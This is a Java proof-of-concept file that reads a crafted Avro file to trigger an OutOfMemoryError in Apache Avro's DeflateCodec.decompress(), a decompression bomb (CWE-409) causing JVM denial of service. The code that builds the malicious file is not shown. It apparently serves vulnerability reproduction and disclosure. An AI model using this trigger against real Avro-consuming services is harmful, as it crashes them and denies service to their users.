package poc;

import org.apache.avro.file.DataFileReader;
import org.apache.avro.generic.GenericDatumReader;
import org.apache.avro.generic.GenericRecord;

import java.io.File;

/**
 * Attempts to read the malicious Avro file created by CreatePoC.
 *
 * When run with a constrained heap (e.g. -Xmx32m), this triggers
 * OutOfMemoryError inside DeflateCodec.decompress() because the
 * codec decompresses into an unbounded ByteArrayOutputStream.
 *
 * Expected stack trace:
 *   java.lang.OutOfMemoryError: Java heap space
 *     at java.util.Arrays.copyOf(...)
 *     at java.io.ByteArrayOutputStream.ensureCapacity(...)
 *     at java.io.ByteArrayOutputStream.write(...)
 *     at java.util.zip.InflaterOutputStream.write(...)
 *     at org.apache.avro.file.DeflateCodec.decompress(DeflateCodec.java:83)
 *     at org.apache.avro.file.DataFileStream$DataBlock.decompressUsing(...)
 *     at org.apache.avro.file.DataFileStream.hasNext(...)
 */
public class TriggerOOM {

    public static void main(String[] args) {
        String inputFile = args.length > 0 ? args[0] : "poc.avro";

        System.out.println("=== Avro Decompression Bomb PoC - OOM Trigger ===");
        System.out.println();
        System.out.println("Reading file: " + inputFile);
        System.out.println("Max heap:     " + (Runtime.getRuntime().maxMemory() / (1024 * 1024)) + " MB");
        System.out.println();

        File f = new File(inputFile);
        if (!f.exists()) {
            System.err.println("ERROR: File not found: " + inputFile);
            System.err.println("Run CreatePoC first to generate the malicious Avro file.");
            System.exit(1);
        }

        System.out.println("File size on disk: " + f.length() + " bytes (" + (f.length() / 1024) + " KB)");
        System.out.println();
        System.out.println("Attempting to read and decompress...");
        System.out.println("(This should trigger OutOfMemoryError in DeflateCodec.decompress())");
        System.out.println();

        try (DataFileReader<GenericRecord> reader =
                new DataFileReader<>(f, new GenericDatumReader<>())) {

            int count = 0;
            while (reader.hasNext()) {
                GenericRecord record = reader.next();
                count++;
                System.out.println("Read record #" + count + " (this should not appear with -Xmx32m)");
            }

            System.out.println();
            System.out.println("WARNING: All records read successfully without OOM.");
            System.out.println("This means the heap was large enough. Try with -Xmx32m.");

        } catch (OutOfMemoryError e) {
            System.err.println();
            System.err.println("*** VULNERABILITY CONFIRMED ***");
            System.err.println();
            System.err.println("OutOfMemoryError triggered during Avro decompression!");
            System.err.println("Error: " + e.getMessage());
            System.err.println();
            System.err.println("Stack trace:");
            e.printStackTrace(System.err);
            System.err.println();
            System.err.println("Root cause: DeflateCodec.decompress() decompresses into an");
            System.err.println("unbounded ByteArrayOutputStream with no size limit, allowing");
            System.err.println("a small compressed payload to expand until OOM.");
            System.err.println();
            System.err.println("CWE-409: Improper Handling of Highly Compressed Data");
            System.err.println("Impact: Denial of Service (DoS) - JVM crash via OOM");
            System.exit(99);

        } catch (Exception e) {
            System.err.println("Unexpected error: " + e.getMessage());
            e.printStackTrace(System.err);
            System.exit(1);
        }
    }
}
